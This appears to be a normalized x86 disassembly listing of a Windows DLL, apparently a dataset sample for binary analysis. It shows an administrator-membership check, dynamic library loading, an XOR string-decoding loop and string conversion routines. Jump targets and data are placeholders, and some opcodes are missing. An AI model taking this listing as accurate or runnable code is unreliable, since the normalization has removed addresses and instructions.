mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
call sub_1000b9e0
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10031e13
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_10051cf5
mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
push [ edi + esi * 4 + 0x1c ]
call sub_1007fa40
push [ edi + esi * 4 ]
mov [ ebp - 0x8 ] eax
call sub_1007fa40
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_1005f1fb
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
int3
push esi
call sub_1007fa40
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_1007fa40
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
mov [ esi ] 0x0
sub_10031f00
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d91
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp esi edi
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
inc eax
push eax
push edi
push esi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
mov [ edi ] bl
sub_10031fc0
mov eax [ esi + 0x2c0 ]
mov [ esi ] r--data
test eax eax
je r-xdata
cmp [ esi + 0x2d8 ] 0x8
jb r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x2c0 ] 0x0
xor ecx ecx
mov [ esi + 0x2d8 ] 0x7
mov [ esi + 0x2d4 ] 0x0
mov [ esi + 0x2c4 ] cx
mov ecx esi
jmp sub_10021ec0
mov eax [ esi + 0x2c4 ]
push eax
call sub_1000a86e
add esp 0x4
sub_1003201d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_100650d7
dec [ ebp + 0x1c ]
add esi 0x2
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_10032060
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10051470
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_100320b0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x500
mov [ ebp - 0x10 ] ebx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
push eax
call [ FreeSid@IAT ]
sub_10032140
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
push 0xffffffff
push 0x0
push eax
push 0x0
mov [ ebp - 0x4 ] 0x0
call sub_10067560
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1003acf0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10032181
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_10025a12
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_100321b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088952
mov eax [ fs : 0x0 ]
push eax
mov eax 0x8438
call sub_10080420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov esi edi
call sub_10018ee0
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
push 0x831c
push eax
lea ecx [ ebp - 0x83ce ]
push ecx
mov [ ebp - 0x83d0 ] ax
call sub_1007f8f0
add esp 0xc
cmp [ edi + 0x90 ] 0x0
mov esi 0x8
jne r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x1
call sub_10069020
mov eax edx
push eax
lea ecx [ ebp - 0x83ec ]
lea ebx [ edi + 0xc ]
push ecx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x7
mov [ ebp - 0x4 ] 0x0
call sub_10022b50
cmp [ ebp - 0x83d8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x90 ]
test eax eax
jne r-xdata
cmp [ edi + 0x84 ] esi
lea eax [ edi + 0x70 ]
jb r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x83ec ]
push edx
call sub_1000a86e
add esp 0x4
push 0x1
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x8444 ] eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x153
call sub_10069020
push edx
lea eax [ ebp - 0x83ec ]
lea ebx [ edi + 0xc ]
push eax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x7
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
cmp [ ebp - 0x83d8 ] esi
jb r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov [ edi + 0x90 ] eax
mov eax [ eax ]
push edi
lea eax [ ebp - 0x83d0 ]
call sub_100564a0
lea edx [ ebp - 0x88 ]
mov eax 0x4f
call sub_10069020
lea edx [ ebp - 0xb0 ]
mov eax 0x9b
call sub_10069020
mov ecx edx
push ecx
lea edx [ ebp - 0x8408 ]
lea ebx [ edi + 0xc ]
push edx
call sub_10029ef0
push eax
lea edx [ ebp - 0x88 ]
lea esi [ ebp - 0x8440 ]
mov [ ebp - 0x4 ] 0x3
call sub_100519f0
push eax
lea edx [ ebp - 0x83d0 ]
lea esi [ ebp - 0x8424 ]
mov [ ebp - 0x4 ] 0x4
call sub_100519f0
add esp 0x10
mov edx eax
mov ecx 0x7
mov [ ebp - 0x4 ] 0x5
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x8440 ]
call sub_100702e0
lea ecx [ ebp - 0x8408 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100702e0
lea eax [ ebp - 0x83d0 ]
push eax
call [ ebp - 0x8444 ]
mov [ edi + 0x50 ] eax
lea ecx [ edi + 0x94 ]
add edi 0xb4
call sub_1002e170
xor eax eax
lea edx [ ebp - 0x64 ]
mov eax 0x48
call sub_10069020
push edx
lea eax [ ebp - 0x83ec ]
lea ebx [ edi + 0xc ]
push eax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x7
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
lea ecx [ ebp - 0x83ec ]
call sub_100702e0
mov eax 0x4
jmp r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x83ec ]
push ecx
call sub_1000a86e
add esp 0x4
sub_10032438
push 0x3
call sub_1003e2e4
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10053809
push 0xff
call sub_10053809
pop ecx
pop ecx
push 0x3
call sub_1003e2e4
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_10032471
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1000d019
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_10068272
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_100324d0
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop edi
retn
push eax
call edi
sub_10032538
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_100221a0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003255f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10066b9f
test al al
je r-xdata
mov edi [ ebp + 0xc ]
push 0x0
push edi
mov ecx esi
call sub_100056ae
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_1000838d
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push ebx
lea ebx [ edi + edi ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
sub_100325e0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ecx
call sub_1003f550
mov eax [ ebp - 0x20 ]
mov esi 0x8
cmp [ ebp - 0xc ] esi
jae r-xdata
mov edx [ ebp - 0x10 ]
push 0x0
push 0x0
push 0x0
push 0x0
push edx
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea eax [ ebp - 0x20 ]
push ebx
mov ebx [ GetProcessHeap@IAT ]
lea ecx [ edi + 0x1 ]
push ecx
push esi
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0xc ] esi
jb r-xdata
cmp [ ebp - 0xc ] 0x8
mov eax [ ebp - 0x20 ]
jae r-xdata
cmp [ ebp - 0xc ] 0x8
jb r-xdata
pop edi
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x10 ]
push 0x0
push 0x0
push edi
push esi
push ecx
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
push esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
pop ebx
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax edi
call sub_10015140
mov ecx [ ebp - 0x28 ]
mov edx [ ecx ]
add esp 0xc
push edx
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
inc ecx
push ecx
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp - 0x28 ]
mov [ edx ] eax
test eax eax
jne r-xdata
push eax
call ebx
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0xc ] 0x8
jb r-xdata
mov ecx [ ebp - 0x24 ]
push esi
push ecx
push eax
mov eax edi
call sub_10015140
add esp 0xc
push esi
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
lea ecx [ ebp - 0x20 ]
call sub_100702e0
mov ecx [ ebp - 0x4 ]
pop ebx
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x20 ]
call sub_100702e0
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
push edx
call sub_1000a86e
add esp 0x4
sub_10032790
push ebp
mov ebp esp
push 0xffffffff
push sub_10087fa0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + edi + 0xc ]
add ecx edi
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
push 0x0
call sub_10039ae0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
or eax 0x4
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
add ecx edi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov esi ecx
call sub_1006d8e0
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10032820
push ebp
mov ebp esp
push 0xffffffff
push sub_100895c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ rw-data ]
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
mov ebx ecx
sar eax 0x2
mov [ ebp - 0x70 ] ebx
cmp eax 0x1
jbe r-xdata
xor eax eax
mov edi [ esi + 0x4 ]
cmp edi [ esi + 0x8 ]
je r-xdata
lea esp [ esp ]
push ebx
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov eax [ esi + 0x8 ]
lea ecx [ edi + 0x4 ]
sub eax ecx
sar eax 0x2
lea edx [ eax * 4 ]
push edx
push ecx
push edi
call sub_1007ec40
add [ esi + 0x8 ] 0xfffffffc
mov ecx [ r--data ]
add esp 0xc
xor edi edi
xor eax eax
lea ebx [ ebx ]
add edi 0x4
cmp edi [ esi + 0x8 ]
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb8
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x10
jb r-xdata
mov esi [ ebp - 0x70 ]
xor eax eax
mov [ ebp - 0x14 ] ax
mov ebx 0x7
xor ecx ecx
mov eax esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x50 ] cx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov eax [ edi ]
add eax 0x20
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x50 ]
call sub_10034100
lea edx [ ebp - 0x50 ]
push edx
lea edx [ ebp - 0x34 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0x4
mov edx eax
mov ecx 0xc9
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x58 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] cx
cmp [ ebp - 0x3c ] esi
jb r-xdata
mov eax [ ebp - 0x6c ]
push eax
call sub_1000a86e
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x50 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100329a0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10027450
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_100329dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_1005aa50
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1000f103
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10066465
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10032b90
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_1000a86e
add esp 0x4
push r--data
call sub_10030594
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x14 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x14 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
